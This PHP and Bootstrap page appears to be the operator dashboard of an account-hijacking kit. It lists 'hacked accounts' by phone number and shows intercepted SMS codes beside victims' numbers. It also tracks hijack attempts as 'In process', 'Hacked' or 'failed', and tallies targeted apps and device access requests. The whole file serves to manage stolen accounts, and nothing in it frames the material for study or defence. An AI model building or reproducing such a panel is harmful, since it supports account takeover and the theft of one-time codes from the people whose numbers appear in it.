<?php
$hacked = $c->query("SELECT * FROM accounts WHERE hacked = 1 LIMIT 3");
$hd_row = $hacked->num_rows;

$alert = $c->query("SELECT * FROM alert  LIMIT 3");
$a_row = $alert->num_rows;

$history = $c->query("SELECT * FROM result  LIMIT 3");
$his_row = $history->num_rows;

$sms = $c->query("SELECT * FROM sms  LIMIT 3");
$sro = $sms->num_rows;

$platform = $c->query("SELECT * FROM app ORDER BY counter DESC LIMIT 3");
$plat_row = $platform->num_rows;

$access = $c->query("SELECT * FROM access  LIMIT 3");
$as_row = $access->num_rows;

$cog = new cog();


?>


<div class="container-fluid pr-md-5 mt-md-2 pl-md-5">
	<div class="row">
		<div class="col-md-6 mt-1">
			<div class="card text-dark brd-success">
				<div class="card-body">
					<h5 class="card-title"><i class="fa fa-certificate"></i> HACKED ACCOUNTS</h5>
				</div>
				<?php
				if ($hd_row > 0) { 
				?>
				<ul class="list-group list-group-flush">
					<?php
					if ($hd_row == 1) {
						while ($zip = $hacked->fetch_array()) {
							?>
							<li class="list-group-item"><i class="fa fa-check"></i> <?php echo $zip['phone']; ?> <span class="float-right"><?php echo $cog->time_ago($zip['timer']); ?></span></li>
							<?php
						}
					echo '<li class="list-group-item text-center text-muted">~~~ <i class="fa fa-warning"></i> ~~~</li>';	
					echo '<li class="list-group-item text-center text-muted">~~~ <i class="fa fa-warning"></i> ~~~</li>';	
					}else if ($hd_row == 2) {
						while ($zip = $hacked->fetch_array()) {
							?>
							<li class="list-group-item"><i class="fa fa-check"></i> <?php echo $zip['phone']; ?> <span class="float-right"><?php echo $cog->time_ago($zip['timer']); ?></span></li>
							<?php
						}
					echo '<li class="list-group-item text-center text-muted">~~~ <i class="fa fa-warning"></i> ~~~</li>';	
					}
					else {
						while ($zip = $hacked->fetch_array()) {
							?>
							<li class="list-group-item"><i class="fa fa-check"></i> <?php echo $zip['phone']; ?> <span class="float-right"><?php echo $cog->time_ago($zip['timer']); ?></span></li>
							<?php
						}	
					}
					?>
				</ul>
				<div class="card-body" style="display: flex;justify-content: space-round;">
					<button class="card-link btn btn-outline-success" onclick="showme('home')"><i class="fa fa-refresh "></i> Refresh</button>
					<button class="card-link btn btn-outline-success" onclick="showme('all_hacked')"><i class="fa fa-folder-open-o "></i> More</button>
				</div>
				<?php
				}else {
					?>
					<ul class="list-group list-group-flush">
						<li class="list-group-item text-center"><i class="fa fa-ban"></i> <span>No Result</span></li>
						<li class="list-group-item text-center"><i class="fa fa-ban"></i> <span>No Result</span></li>
						<li class="list-group-item text-center"><i class="fa fa-ban"></i> <span>No Result</span></li>
					</ul>
					<div class="card-body" style="display: flex;justify-content: space-round;">
					<button class="card-link btn btn-outline-success" disabled><i class="fa fa-warning "></i> ------</button>
					<button class="card-link btn btn-outline-success" disabled><i class="fa fa-warning "></i> ------</button>
				</div>
					<?php
				}
				?>
			</div>
		</div>		
		<div class="col-md-6 mt-1">
			<div class="card text-dark brd-danger">
				<div class="card-body">
					<h5 class="card-title"><i class="fa fa-bullseye text-danger"></i> Alerts</h5>
				</div>
				<?php
				if ($a_row > 0) { 
				?>
				<ul class="list-group list-group-flush">
				<?php
					if ($a_row == 1) {
						while ($zip = $alert->fetch_array()) {
							?>
							<li class="list-group-item"><i class="fa fa-check"></i> <?php echo $zip['phone_type']; ?> <span class="float-right"><?php echo $cog->time_ago($zip['timer']); ?></span></li>
							<?php
						}
					echo '<li class="list-group-item text-center text-muted">~~~ <i class="fa fa-warning"></i> ~~~</li>';	
					echo '<li class="list-group-item text-center text-muted">~~~ <i class="fa fa-warning"></i> ~~~</li>';	
					}else if ($a_row == 2) {
						while ($zip = $alert->fetch_array()) {
							?>
							<li class="list-group-item"><i class="fa fa-check"></i> <?php echo $zip['phone_type']; ?> <span class="float-right"><?php echo $cog->time_ago($zip['timer']); ?></span></li>
							<?php
						}
					echo '<li class="list-group-item text-center text-muted">~~~ <i class="fa fa-warning"></i> ~~~</li>';	
					}
					else {
						while ($zip = $alert->fetch_array()) {
							?>
							<li class="list-group-item"><i class="fa fa-check"></i> <?php echo $zip['phone_type']; ?> <span class="float-right"><?php echo $cog->time_ago($zip['timer']); ?></span></li>
							<?php
						}	
					}
					?>	
				</ul>
				<div class="card-body" style="display: flex;justify-content: space-round;">
					<button class="card-link btn btn-outline-danger " onclick="showme('home')"><i class="fa fa-refresh "></i> Refresh</button>
					<button class="card-link btn btn-outline-danger " onclick="showme('all_alert')"><i class="fa fa-folder-open-o "></i> More</button>
				</div>
				<?php
				}else {
					?>
					<ul class="list-group list-group-flush">
						<li class="list-group-item text-center"><i class="fa fa-ban"></i> <span>No Result</span></li>
						<li class="list-group-item text-center"><i class="fa fa-ban"></i> <span>No Result</span></li>
						<li class="list-group-item text-center"><i class="fa fa-ban"></i> <span>No Result</span></li>
					</ul>
					<div class="card-body" style="display: flex;justify-content: space-round;">
					<button class="card-link btn btn-outline-danger" disabled><i class="fa fa-warning "></i> ------</button>
					<button class="card-link btn btn-outline-danger" disabled><i class="fa fa-warning "></i> ------</button>
				</div>
					<?php
				}
				?>
			</div>
		</div>
		<div class="col-md-12">
			<div class="card brd-info text-dark">
				<div class="card-body">
					<h5 class="card-title float-left">History</h5>
					<div class="float-right"><i class="fa fa-history fa-2x"></i></div>
				</div>	
				<?php
				if ($his_row > 0) { 
				?>
				<ul class="list-group list-group-flush">
				<?php
					if ($his_row == 1) {
						while ($zip = $history->fetch_array()) {
							if (empty($zip['status'])) {
								$sta = 'In process';
							}elseif ($zip['status']){
								$sta = 'Hacked';
							}else {
								$sta = 'failed';
							}
							?>
							<li class="list-group-item" style="display: flex;justify-content: space-between;">
								
								<span class="float-left"> <?php echo (!empty($zip['phone'])) ? $zip['phone'] : 'In process'; ?> </span>

								<span> <?php echo $sta; ?></span> 
								
								<span class="float-right"><?php echo $cog->time_ago($zip['timer']); ?></span>
							</li>
							<?php
						}
					echo '<li class="list-group-item text-center text-muted">~~~ <i class="fa fa-warning"></i> ~~~</li>';	
					echo '<li class="list-group-item text-center text-muted">~~~ <i class="fa fa-warning"></i> ~~~</li>';	
					}else if ($his_row == 2) {
						while ($zip = $history->fetch_array()) {
							if (empty($zip['status'])) {
								$sta = 'In process';
							}elseif ($zip['status']){
								$sta = 'Hacked';
							}else {
								$sta = 'failed';
							}
							?>
							<li class="list-group-item" style="display: flex;justify-content: space-between;">
								
								<span class="float-left"> <?php echo (!empty($zip['phone'])) ? $zip['phone'] : 'In process'; ?> </span>

								<span> <?php echo $sta; ?></span> 
								
								<span class="float-right"><?php echo $cog->time_ago($zip['timer']); ?></span>
							</li>
							<?php
						}
					echo '<li class="list-group-item text-center text-muted">~~~ <i class="fa fa-warning"></i> ~~~</li>';	
					}
					else {
						while ($zip = $history->fetch_array()) {
							if (empty($zip['status'])) {
								$sta = 'In process';
							}elseif ($zip['status']){
								$sta = 'Hacked';
							}else {
								$sta = 'failed';
							}
							?>
							<li class="list-group-item" style="display: flex;justify-content: space-between;">
								
								<span class="float-left"> <?php echo (!empty($zip['phone'])) ? $zip['phone'] : 'In process'; ?> </span>

								<span> <?php echo $sta; ?></span> 
								
								<span class="float-right"><?php echo $cog->time_ago($zip['timer']); ?></span>
							</li>
							<?php
						}	
					}
					?>	
				</ul>
				<div class="card-body" style="">
					<div class="float-right" style="display: flex;justify-content: space-between;">
						<button class="card-link btn btn-outline-info" onclick="showme('home')"><i class="fa fa-refresh "></i> Refresh</button>
						<button class="card-link btn btn-outline-info" onclick="showme('all_history')"><i class="fa fa-folder-open-o"></i> More</button>
					</div>
				</div>
				<?php
				}else {
					?>
					<ul class="list-group list-group-flush">
						<li class="list-group-item text-center"><i class="fa fa-ban"></i> <span>No Result</span></li>
						<li class="list-group-item text-center"><i class="fa fa-ban"></i> <span>No Result</span></li>
						<li class="list-group-item text-center"><i class="fa fa-ban"></i> <span>No Result</span></li>
					</ul>
					<div class="card-body" style="display: flex;justify-content: space-round;">
					<button class="card-link btn btn-outline-info" disabled><i class="fa fa-warning "></i> ------</button>
					<button class="card-link btn btn-outline-info" disabled><i class="fa fa-warning "></i> ------</button>
				</div>
					<?php
				}
				?>
			</div>
		</div>
		<div class="col-md-4">
			<div class="card text-dark brd-warning">
				<div class="card-body">
					<h5 class="card-title float-left">SMS</h5>
					<div class="float-right text-dark"><i class="fa fa-envelope-o fa-2x"></i></div>
				</div>
				<?php
				if ($sro > 0) { 
				?>
				<ul class="list-group list-group-flush">
					<?php
					if ($sro == 1) {
						while ($zip = $sms->fetch_array()) {
							?>
							<li class="list-group-item"><?php echo $zip['phone']; ?> ~ <b><?php echo $zip['code']; ?></b> <span class="float-right text-dark"><?php echo $cog->time_ago($zip['timer']); ?></span></li>
							<?php
						}
					echo '<li class="list-group-item text-center text-muted">~~~ <i class="fa fa-warning"></i> ~~~</li>';	
					echo '<li class="list-group-item text-center text-muted">~~~ <i class="fa fa-warning"></i> ~~~</li>';	
					}else if ($sro == 2) {
						while ($zip = $sms->fetch_array()) {
							?>
							<li class="list-group-item"><?php echo $zip['phone']; ?> ~ <b><?php echo $zip['code']; ?></b> <span class="float-right text-dark"><?php echo $cog->time_ago($zip['timer']); ?></span></li>
							<?php
						}
					echo '<li class="list-group-item text-center text-muted">~~~ <i class="fa fa-warning"></i> ~~~</li>';	
					}
					else {
						while ($zip = $sms->fetch_array()) {
							?>
							<li class="list-group-item"><?php echo $zip['phone']; ?> ~ <b><?php echo $zip['code']; ?></b> <span class="float-right text-dark"><?php echo $cog->time_ago($zip['timer']); ?></span></li>
							<?php
						}	
					}
					?>
				</ul>
				<div class="card-body" style="display: flex;justify-content: space-round;">
					<button class="card-link text-dark btn btn-outline-warning" onclick="showme('home')"><i class="fa fa-refresh "></i> Refresh</button>
					<button class="card-link text-dark btn btn-outline-warning" onclick="showme('all_sms')"><i class="fa fa-folder-open-o "></i> More</button>
				</div>
				<?php
				}else {
					?>
					<ul class="list-group list-group-flush">
						<li class="list-group-item text-center"><i class="fa fa-ban"></i> <span>No Result</span></li>
						<li class="list-group-item text-center"><i class="fa fa-ban"></i> <span>No Result</span></li>
						<li class="list-group-item text-center"><i class="fa fa-ban"></i> <span>No Result</span></li>
					</ul>
					<div class="card-body" style="display: flex;justify-content: space-round;">
					<button class="card-link btn btn-outline-warning" disabled><i class="fa fa-warning "></i> ------</button>
					<button class="card-link btn btn-outline-warning" disabled><i class="fa fa-warning "></i> ------</button>
				</div>
					<?php
				}
				?>
			</div>
		</div>	
		<div class="col-md-4">
			<div class="card text-dark brd-primary">
				<div class="card-body">
					<h5 class="card-title float-left">Platform</h5>
					<div class="float-right"><i class="fa fa-android fa-2x"></i></div>
				</div>
				<?php
				if ($plat_row > 0) { 
				?>
				<ul class="list-group list-group-flush">
					<?php
					if ($plat_row == 1) {
						while ($zip = $platform->fetch_array()) {
							?>
							<li class="list-group-item"> <?php echo $zip['app_name']; ?> <span class="float-right"><?php echo $zip['counter']; ?></span></li>
							<?php
						}
					echo '<li class="list-group-item text-center text-muted">~~~ <i class="fa fa-warning"></i> ~~~</li>';	
					echo '<li class="list-group-item text-center text-muted">~~~ <i class="fa fa-warning"></i> ~~~</li>';	
					}else if ($plat_row == 2) {
						$container = "";
						while ($zip = $platform->fetch_array()) {
							?>
							<li class="list-group-item"> <?php echo $zip['app_name']; ?> <span class="float-right"><?php echo $zip['counter']; ?></span></li>
							<?php
						}
					echo '<li class="list-group-item text-center text-muted">~~~ <i class="fa fa-warning"></i> ~~~</li>';	
					}
					else {
						$container = "";
						while ($zip = $platform->fetch_array()) {
							?>
							<li class="list-group-item"> <?php echo $zip['app_name']; ?> <span class="float-right"><?php echo $zip['counter']; ?></span></li>
							<?php
						}	
					}
					?>
				</ul>
				<div class="card-body" style="display: flex;justify-content: space-round;">
					<button class="card-link btn btn-outline-primary " onclick="showme('home')"><i class="fa fa-refresh "></i> Refresh</button>
					<button class="card-link btn btn-outline-primary " onclick="showme('all_app')"><i class="fa fa-folder-open-o "></i> More</button>
				</div>
				<?php
				}else {
					?>
					<ul class="list-group list-group-flush">
						<li class="list-group-item text-center"><i class="fa fa-ban"></i> <span>No Result</span></li>
						<li class="list-group-item text-center"><i class="fa fa-ban"></i> <span>No Result</span></li>
						<li class="list-group-item text-center"><i class="fa fa-ban"></i> <span>No Result</span></li>
					</ul>
					<div class="card-body" style="display: flex;justify-content: space-round;">
					<button class="card-link btn btn-outline-primary" disabled><i class="fa fa-warning "></i> ------</button>
					<button class="card-link btn btn-outline-primary" disabled><i class="fa fa-warning "></i> ------</button>
				</div>
					<?php
				}
				?>
			</div>
		</div>
		<div class="col-md-4">
			<div class="card text-dark brd-secondary">
				<div class="card-body">
					<h5 class="card-title float-left">Access</h5>
					<div class="float-right"><i class="fa fa-exchange fa-2x"></i></div>
				</div>
				<?php
				if ($as_row > 0) { 
				?>
				<ul class="list-group list-group-flush">
					<?php
					if ($as_row == 1) {
						while ($zip = $access->fetch_array()) {
							?>
							<li class="list-group-item"> <?php echo $zip['request_id']; ?> <span class="float-right"><?php echo $zip['device']; ?></span></li>
							<?php
						}
					echo '<li class="list-group-item text-center text-muted">~~~ <i class="fa fa-warning"></i> ~~~</li>';	
					echo '<li class="list-group-item text-center text-muted">~~~ <i class="fa fa-warning"></i> ~~~</li>';	
					}else if ($as_row == 2) {
						while ($zip = $access->fetch_array()) {
							?>
							<li class="list-group-item"> <?php echo $zip['request_id']; ?> <span class="float-right"><?php echo $zip['device']; ?></span></li>
							<?php
						}
					echo '<li class="list-group-item text-center text-muted">~~~ <i class="fa fa-warning"></i> ~~~</li>';	
					}
					else {
						while ($zip = $access->fetch_array()) {
							?>
							<li class="list-group-item"> <?php echo $zip['request_id']; ?> <span class="float-right"><?php echo $zip['device']; ?></span></li>
							<?php 
						}	
					}
					?>
				</ul>
				<div class="card-body" style="display: flex;justify-content: space-round;">
					<button class="card-link btn btn-outline-secondary" onclick="showme('home')"><i class="fa fa-refresh "></i> Refresh</button>
					<button class="card-link btn btn-outline-secondary" onclick="showme('all_access')"><i class="fa fa-folder-open-o "></i> More</button>
				</div>
				<?php
				}else {
					?>
					<ul class="list-group list-group-flush">
						<li class="list-group-item text-center"><i class="fa fa-ban"></i> <span>No Result</span></li>
						<li class="list-group-item text-center"><i class="fa fa-ban"></i> <span>No Result</span></li>
						<li class="list-group-item text-center"><i class="fa fa-ban"></i> <span>No Result</span></li>
					</ul>
					<div class="card-body" style="display: flex;justify-content: space-round;">
					<button class="card-link btn btn-outline-secondary" disabled><i class="fa fa-warning "></i> ------</button>
					<button class="card-link btn btn-outline-secondary" disabled><i class="fa fa-warning "></i> ------</button>
				</div>
					<?php
				}
				?>
			</div>
		</div>	
	</div>
</div>